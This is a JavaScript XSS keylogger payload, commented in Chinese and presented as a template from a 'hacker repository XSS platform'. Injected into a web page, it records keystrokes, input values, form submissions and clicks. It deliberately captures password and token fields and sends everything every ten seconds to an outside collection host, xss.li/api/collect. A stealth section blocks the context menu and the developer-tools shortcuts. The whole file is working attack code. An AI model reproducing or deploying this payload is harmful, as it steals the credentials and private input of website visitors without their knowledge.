// 键盘记录器Payload - 黑客仓库XSS平台模板
// 记录用户的键盘输入并发送到指定服务器

(function() {
    'use strict';
    
    // 配置信息
    var config = {
        serverUrl: 'https://xss.li' + '/api/collect', // 数据接收地址
        batchSize: 50, // 批量发送大小
        sendInterval: 10000, // 发送间隔（毫秒）
        maxStorage: 1000, // 最大存储记录数
        capturePasswords: true, // 是否捕获密码字段
        captureForms: true, // 是否捕获表单数据
        stealthMode: true // 是否启用隐身模式
    };
    
    // 数据存储
    var keystrokeData = [];
    var formData = [];
    var isRecording = true;
    
    // 工具函数
    var utils = {
        // 获取当前时间戳
        timestamp: function() {
            return new Date().toISOString();
        },
        
        // 获取元素选择器
        getSelector: function(element) {
            if (!element || element === document.body) return 'body';
            
            var selector = element.tagName.toLowerCase();
            
            if (element.id) {
                selector += '#' + element.id;
            } else if (element.className) {
                selector += '.' + element.className.split(' ').join('.');
            } else if (element.name) {
                selector += '[name="' + element.name + '"]';
            }
            
            return selector;
        },
        
        // 判断是否为敏感字段
        isSensitiveField: function(element) {
            if (!element) return false;
            
            var sensitiveTypes = ['password', 'email', 'tel', 'creditcard'];
            var sensitiveNames = ['password', 'pwd', 'pass', 'secret', 'key', 'token'];
            
            // 检查type属性
            if (element.type && sensitiveTypes.some(type => element.type.toLowerCase().includes(type))) {
                return true;
            }
            
            // 检查name属性
            if (element.name && sensitiveNames.some(name => element.name.toLowerCase().includes(name))) {
                return true;
            }
            
            // 检查id属性
            if (element.id && sensitiveNames.some(name => element.id.toLowerCase().includes(name))) {
                return true;
            }
            
            // 检查placeholder
            if (element.placeholder && sensitiveNames.some(name => element.placeholder.toLowerCase().includes(name))) {
                return true;
            }
            
            return false;
        }
    };
    
    // 键盘记录器
    var keylogger = {
        // 初始化
        init: function() {
            this.setupEventListeners();
            this.startDataSending();
            
            if (config.stealthMode) {
                this.hideTraces();
            }
        },
        
        // 设置事件监听器
        setupEventListeners: function() {
            var self = this;
            
            // 键盘事件
            document.addEventListener('keydown', function(e) {
                if (!isRecording) return;
                self.recordKeystroke(e, 'keydown');
            });
            
            document.addEventListener('keyup', function(e) {
                if (!isRecording) return;
                self.recordKeystroke(e, 'keyup');
            });
            
            document.addEventListener('keypress', function(e) {
                if (!isRecording) return;
                self.recordKeystroke(e, 'keypress');
            });
            
            // 焦点事件
            document.addEventListener('focus', function(e) {
                if (!isRecording) return;
                self.recordFocusChange(e.target, 'focus');
            }, true);
            
            document.addEventListener('blur', function(e) {
                if (!isRecording) return;
                self.recordFocusChange(e.target, 'blur');
            }, true);
            
            // 表单事件
            if (config.captureForms) {
                document.addEventListener('submit', function(e) {
                    if (!isRecording) return;
                    self.recordFormSubmission(e.target);
                }, true);
                
                // 监听输入变化
                document.addEventListener('input', function(e) {
                    if (!isRecording) return;
                    self.recordInputChange(e.target);
                }, true);
                
                document.addEventListener('change', function(e) {
                    if (!isRecording) return;
                    self.recordInputChange(e.target);
                }, true);
            }
            
            // 鼠标事件
            document.addEventListener('click', function(e) {
                if (!isRecording) return;
                self.recordMouseEvent(e, 'click');
            });
            
            document.addEventListener('dblclick', function(e) {
                if (!isRecording) return;
                self.recordMouseEvent(e, 'dblclick');
            });
        },
        
        // 记录按键
        recordKeystroke: function(event, type) {
            var record = {
                type: 'keystroke',
                subtype: type,
                key: event.key,
                code: event.code,
                keyCode: event.keyCode,
                which: event.which,
                location: event.location,
                repeat: event.repeat,
                ctrlKey: event.ctrlKey,
                shiftKey: event.shiftKey,
                altKey: event.altKey,
                metaKey: event.metaKey,
                timestamp: utils.timestamp(),
                target: utils.getSelector(event.target),
                targetType: event.target.type || event.target.tagName,
                isSensitive: utils.isSensitiveField(event.target)
            };
            
            // 如果是敏感字段且不捕获密码，则跳过
            if (record.isSensitive && !config.capturePasswords) {
                return;
            }
            
            keystrokeData.push(record);
            
            // 限制存储大小
            if (keystrokeData.length > config.maxStorage) {
                keystrokeData = keystrokeData.slice(-config.maxStorage);
            }
        },
        
        // 记录焦点变化
        recordFocusChange: function(element, type) {
            var record = {
                type: 'focus',
                subtype: type,
                target: utils.getSelector(element),
                targetType: element.type || element.tagName,
                isSensitive: utils.isSensitiveField(element),
                timestamp: utils.timestamp()
            };
            
            keystrokeData.push(record);
        },
        
        // 记录鼠标事件
        recordMouseEvent: function(event, type) {
            var record = {
                type: 'mouse',
                subtype: type,
                x: event.clientX,
                y: event.clientY,
                target: utils.getSelector(event.target),
                timestamp: utils.timestamp()
            };
            
            keystrokeData.push(record);
        },
        
        // 记录表单提交
        recordFormSubmission: function(form) {
            var formRecord = {
                type: 'form',
                subtype: 'submit',
                form: utils.getSelector(form),
                action: form.action,
                method: form.method,
                data: {},
                timestamp: utils.timestamp()
            };
            
            // 收集表单数据
            var formData = new FormData(form);
            for (var pair of formData.entries()) {
                var field = form.querySelector('[name="' + pair[0] + '"]');
                var isSensitive = field && utils.isSensitiveField(field);
                
                if (!isSensitive || config.capturePasswords) {
                    formRecord.data[pair[0]] = pair[1];
                } else {
                    formRecord.data[pair[0]] = '[REDACTED]';
                }
            }
            
            formData.push(formRecord);
        },
        
        // 记录输入变化
        recordInputChange: function(element) {
            if (element.tagName !== 'INPUT' && element.tagName !== 'TEXTAREA' && element.tagName !== 'SELECT') {
                return;
            }
            
            var record = {
                type: 'input',
                target: utils.getSelector(element),
                targetType: element.type || element.tagName,
                isSensitive: utils.isSensitiveField(element),
                timestamp: utils.timestamp()
            };
            
            if (!record.isSensitive || config.capturePasswords) {
                record.value = element.value;
            } else {
                record.value = '[REDACTED]';
                record.length = element.value.length;
            }
            
            keystrokeData.push(record);
        },
        
        // 隐藏痕迹
        hideTraces: function() {
            // 防止被调试
            var devtools = /./;
            devtools.toString = function() {
                // 如果打开开发者工具，停止记录
                isRecording = false;
                return 'DevTools detected, keylogger stopped';
            };
            console.log('%c', devtools);
            
            // 禁用右键菜单
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
            });
            
            // 禁用F12和其他调试快捷键
            document.addEventListener('keydown', function(e) {
                if (e.keyCode === 123 || // F12
                    (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
                    (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
                    (e.ctrlKey && e.keyCode === 85)) { // Ctrl+U
                    e.preventDefault();
                    isRecording = false;
                }
            });
        },
        
        // 开始数据发送
        startDataSending: function() {
            var self = this;
            
            setInterval(function() {
                self.sendData();
            }, config.sendInterval);
        },
        
        // 发送数据
        sendData: function() {
            if (keystrokeData.length === 0 && formData.length === 0) {
                return;
            }
            
            var payload = {
                type: 'keylogger',
                timestamp: utils.timestamp(),
                url: window.location.href,
                referrer: document.referrer,
                userAgent: navigator.userAgent,
                data: {
                    keystrokes: keystrokeData.slice(),
                    forms: formData.slice()
                }
            };
            
            // 清空已发送的数据
            keystrokeData = [];
            formData = [];
            
            // 发送数据
            try {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', config.serverUrl, true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(JSON.stringify(payload));
            } catch (e) {
                console.log('发送键盘记录数据失败:', e);
            }
        }
    };
    
    // 初始化键盘记录器
    keylogger.init();
    
    console.log('💻 黑客仓库XSS平台 - 键盘记录器已启动');
    console.log('记录间隔: ' + config.sendInterval + 'ms');
    console.log('批量大小: ' + config.batchSize);
    
})();